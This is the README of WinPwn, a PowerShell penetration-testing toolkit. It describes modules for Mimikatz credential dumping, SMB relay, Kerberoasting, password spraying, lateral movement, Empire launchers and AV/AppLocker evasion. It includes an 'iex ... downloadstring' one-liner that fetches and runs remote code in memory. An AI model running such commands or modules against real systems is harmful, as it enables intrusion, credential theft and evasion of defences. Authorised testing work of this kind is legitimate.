# WinPwn
In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. For this reason I wrote my own script with automatic proxy recognition and integration. The script is mostly based on well-known large other offensive security Powershell projects. I only load them one after the other into RAM via IEX Downloadstring and partially automate the execution to save time.

Yes it is not a C# and it may be flagged by antivirus solutions. Windows Defender for example blocks some of the known scripts/functions.

Different local recon modules, domain recon modules, pivilege escalation and exploitation modules. Any suggestions, feedback and comments are welcome!

Just Import the Modules with "Import-Module .\WinPwn_v0.7.ps1" or with 
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')

Functions available after Import:
1) #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
2) #### `Inveigh` -> Executes Inveigh in a new Console window (https://github.com/Kevin-Robertson/Inveigh), SMB-Relay attacks with Session management afterwards
3) #### `sessionGopher` -> Executes Sessiongopher and Asking for parameters (https://github.com/Arvanaghi/SessionGopher)
4) #### `Mimikatzlocal` -> Executes Invoke-WCMDump and Invoke-Mimikatz (https://github.com/PowerShellMafia/PowerSploit)
5) #### `localreconmodules` -> Collects system Informations, Executes passhunt (https://github.com/Dionach/PassHunt), Executes Get-Computerdetails and Just another Windows Privilege escalation script + Winspect (https://github.com/PowerShellMafia/PowerSploit, https://github.com/A-mIn3/WINspect, https://github.com/411Hall/JAWS)
6) #### `JAWS` -> Just another Windows Privilege Escalation script gets executed
7) #### `domainreconmodules` -> Different Powerview situal awareness functions get executed and the output stored on disk. In Addition a Userlist for DomainpasswordSpray gets stored on disk. An AD-Report is generated in CSV Files (or XLS if excel is installed) with ADRecon. (https://github.com/sense-of-security/ADRecon, https://github.com/PowerShellMafia/PowerSploit, https://github.com/dafthack/DomainPasswordSpray)
8) #### `Privescmodules` -> Executes different privesc scripts in memory (Sherlock https://github.com/rasta-mouse/Sherlock, PowerUp, GPP-Files, WCMDump)
9) #### `lazagnemodule` -> Downloads and executes lazagne.exe (if not detected by AV) (https://github.com/AlessandroZ/LaZagne)
10) #### `latmov` -> Searches for Systems with Admin-Access in the domain for lateral movement. Mass-Mimikatz can be used after for the found systems. Domainpassword-Spray for new Credentials can also be used here.
11) #### `empirelauncher` -> Launch powershell empire oneliner on remote Systems (https://github.com/EmpireProject/Empire)
12) #### `shareenumeration` -> Invoke-Filefinder and Invoke-Sharefinder from Powerview (Powersploit)
13) #### `groupsearch` -> Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)
14) #### `Kerberoasting` -> Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking
15) #### `isadmin` -> Checks for local admin access on the local system
16) #### `Sharphound` -> Downloads Sharphound and collects Information for the Bloodhound DB
17) #### `adidnswildcard` -> Create a Active Directory-Integrated DNS Wildcard Record and run Inveigh for mass hash gathering. (https://blog.netspi.com/exploiting-adidns/#wildcard)

The "oBEJHzXyARrq.exe"-Executable is an obfuscated Version of jaredhaights PSAttack Tool for Applocker/PS-Restriction Bypass (https://github.com/jaredhaight/PSAttack).

Todo:
- Get the scripts from my own creds repository (https://github.com/SecureThisShit/Creds) to be independent from changes in the original repositories.
- Proxy Options via PAC-File are not correctly found in the moment
- Obfuscate all Scripts for AV-Evasion

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/Pwn.png)


## Legal disclaimer:
Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
